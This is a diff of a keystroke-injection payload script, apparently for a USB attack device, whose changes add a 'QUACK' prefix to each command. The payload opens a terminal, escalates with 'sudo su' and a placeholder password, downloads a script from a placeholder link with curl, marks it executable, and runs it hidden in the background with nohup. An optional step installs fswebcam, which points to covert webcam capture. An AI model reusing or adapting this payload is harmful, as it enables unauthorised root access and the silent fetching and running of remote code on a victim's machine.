@@ -16,43 +16,43 @@
 *         - for add the -x permission to the script.sh downloaded
 
 
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
 
 * #### Permission ####
 
 * This section of sudo time depends by the computer power on which it runs.
 * So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is set now or smaller depending on your needs.
 
-STRING sudo su
-ENTER
-DELAY 500
+QUACK STRING sudo su
+QUACK ENTER
+QUACK DELAY 500
 * REQUIRED - sudo Password
-STRING SUDO-PSWD
-ENTER
+QUACK STRING SUDO-PSWD
+QUACK ENTER
 * DELAY Based On Computer Power
-DELAY 5000
+QUACK DELAY 5000
 
 * If you want to install the dependency of fswebcam you should decommend it.
-* STRING apt install fswebcam -y
-* ENTER
-* DELAY Based On Internet Power
-* DELAY 5000
+* QUACK STRING apt install fswebcam -y
+* QUACK ENTER
+* QUACK DELAY Based On Internet Power
+* QUACK DELAY 5000
 
 
 * #### Script ####
 
 
 * REQUIRED - replace example.com with your script.sh link
-STRING curl SCRIPT-SH-LINK > script.sh
-ENTER
+QUACK STRING curl SCRIPT-SH-LINK > script.sh
+QUACK ENTER
 * DELAY Based On Internet Power
-DELAY 4000
+QUACK DELAY 4000
 
-STRING chmod +x script.sh
-ENTER
-DELAY 500
+QUACK STRING chmod +x script.sh
+QUACK ENTER
+QUACK DELAY 500
 
-STRING nohup ./script.sh > /dev/null 2>&1 & exit
-ENTER
+QUACK STRING nohup ./script.sh > /dev/null 2>&1 & exit
+QUACK ENTER
